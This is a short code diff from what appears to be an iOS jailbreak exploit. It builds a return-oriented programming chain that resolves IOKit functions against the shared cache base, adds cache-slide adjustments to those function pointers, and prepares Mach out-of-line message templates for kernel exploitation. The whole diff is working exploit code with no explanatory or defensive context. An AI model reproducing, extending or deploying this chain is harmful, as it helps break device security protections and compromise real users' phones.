@@ -1022,12 +1022,13 @@ StoreR0(push, where)
     
     argss->waitTime.tv_sec = 10;
     argss->waitTime.tv_nsec = 10000000;
-    argss->_io_service_get_matching_service = IOKIT_io_service_get_matching_service - DYCACHE_BASE + 1;
-    argss->_io_connect_method_scalarI_structureI = IOKIT_io_connect_method_scalarI_structureI - DYCACHE_BASE + 1;
-    argss->_IOServiceOpen = IOKIT_IOServiceOpen - DYCACHE_BASE + 1;
-    argss->_IOServiceClose = IOKIT_IOServiceClose - DYCACHE_BASE + 1;
-    argss->_IOServiceWaitQuiet = IOKIT_IOServiceWaitQuiet - DYCACHE_BASE + 1;
-    argss->_host_get_io_master = LS_K_host_get_io_master - DYCACHE_BASE + 1;
+    
+    argss->_io_service_get_matching_service = IOKIT_io_service_get_matching_service - _DYCACHE_BASE + 1;
+    argss->_io_connect_method_scalarI_structureI = IOKIT_io_connect_method_scalarI_structureI - _DYCACHE_BASE + 1;
+    argss->_IOServiceOpen = IOKIT_IOServiceOpen - _DYCACHE_BASE + 1;
+    argss->_IOServiceClose = IOKIT_IOServiceClose - _DYCACHE_BASE + 1;
+    argss->_IOServiceWaitQuiet = IOKIT_IOServiceWaitQuiet - _DYCACHE_BASE + 1;
+    argss->_host_get_io_master = LS_K_host_get_io_master - _DYCACHE_BASE + 1;
     argss->oolmsg_template.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
     argss->oolmsg_template.header.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
     argss->oolmsg_template.header.msgh_local_port = MACH_PORT_NULL;
@@ -1068,6 +1069,13 @@ StoreR0(push, where)
     RopCallFunction3(PUSH, @"_open", SEG_VAR(b), O_RDWR|O_CREAT|O_TRUNC, 0666);
     RopNopSlide(PUSH);
     StoreR0(PUSH, SEG_VAR(fd2));
+    
+    RopAddWriteDeref(PUSH, SEG_VAR(_IOServiceOpen), SEG_VAR(cache_slide));
+    RopAddWriteDeref(PUSH, SEG_VAR(_IOServiceWaitQuiet), SEG_VAR(cache_slide));
+    RopAddWriteDeref(PUSH, SEG_VAR(_IOServiceClose), SEG_VAR(cache_slide));
+    RopAddWriteDeref(PUSH, SEG_VAR(_io_connect_method_scalarI_structureI), SEG_VAR(cache_slide));
+    RopAddWriteDeref(PUSH, SEG_VAR(_io_service_get_matching_service), SEG_VAR(cache_slide));
+    RopAddWriteDeref(PUSH, SEG_VAR(_host_get_io_master), SEG_VAR(cache_slide));
 
     RopCallFunction0(PUSH, @"_task_self_trap");
     StoreR0(PUSH, SEG_VAR(mach_task_self));
